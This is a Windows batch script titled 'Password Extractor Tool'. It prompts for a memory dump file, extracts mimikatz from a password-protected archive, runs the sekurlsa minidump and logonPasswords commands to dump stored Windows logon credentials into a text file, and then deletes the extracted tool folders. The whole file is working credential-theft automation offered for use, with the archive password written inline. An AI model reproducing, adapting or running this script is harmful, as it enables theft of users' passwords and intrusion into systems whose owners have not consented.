@echo off
Title = Password Extractor Tool.
@echo Password Extractor Tool.
set CD_original=%CD%
%~d0
cd %~dp0
if not "%1"=="" set dumpfile=%1
if not "%dumpfile%"=="" (
if not exist "%dumpfile%" @echo Unable to locate "%dumpfile%"!
if not exist "%dumpfile%" pause
if not exist "%dumpfile%" exit
set dumpfile2=%dumpfile%
goto extract_data
)
set CD_original=%CD%
:dumplist
@echo Dumps ---------------------------------
dir /B *.dmp
@echo ---------------------------------------
set dumpfile=
set /p dumpfile=File: %=%
if "%dumpfile%"=="" goto dumplist
if not exist "%CD%\%dumpfile%" @echo Unable to locate "%CD%\%dumpfile%"
if not exist "%CD%\%dumpfile%" goto dumplist
set dumpfile=%CD%\%dumpfile%
CD %CD_original%
:move_dump
set dumpfile2=%dumpfile%
:extract_data
@echo Extracting software...
"7z.exe" x -o"%CD%" -y "mimikatz.zip" -p"KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj" >nul
@echo Dumping password data...
"x32\mimikatz.exe" "sekurlsa::minidump %dumpfile2%" "sekurlsa::logonPasswords full" "exit" >> "%dumpfile%_Passwords.txt"
RD /S /Q "x32"
RD /S /Q "x64"
if not exist "%dumpfile2%_Passwords.txt" @echo Failed to extract the password data.
if exist "%dumpfile2%_Passwords.txt" @echo Successfully extracted the password data.
if "%1"=="" move /y "%dumpfile2%" "%dumpfile%" >nul
CD %CD_original%
pause >nul